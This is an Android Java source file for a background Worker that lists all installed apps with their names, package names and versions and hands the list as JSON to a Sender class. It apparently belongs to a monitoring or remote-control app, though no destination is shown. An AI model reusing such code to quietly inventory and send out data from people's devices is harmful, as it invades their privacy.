package com.behavioralanalysis.service;

import android.content.Context;
import android.content.pm.PackageInfo;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class Apps extends Worker {
    public static final String TAG = "app";

    public Apps(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            JSONArray array = new JSONArray();
            Context context = MainService.getContext();
            List<PackageInfo> packages = context
                    .getPackageManager()
                    .getInstalledPackages(0);

            for (int i = 0; i < packages.size(); i++) {
                PackageInfo packageInfo = packages.get(i);
                if (packageInfo.versionName == null) {
                    continue;
                }

                try {
                    JSONObject object = new JSONObject();
                    object.put(
                            "appName",
                            packageInfo.applicationInfo.loadLabel(
                                    context.getPackageManager()
                            ).toString()
                    );
                    object.put("packageName", packageInfo.packageName);
                    object.put("varsionName", packageInfo.versionName);
                    object.put("versionCode", packageInfo.versionCode);

                    array.put(object);
                } catch (JSONException ex) {
                }
            }

            Sender.send(TAG, array.toString());

            return Result.success();
        } catch (Exception ex) {
            return Result.failure();
        }
    }
}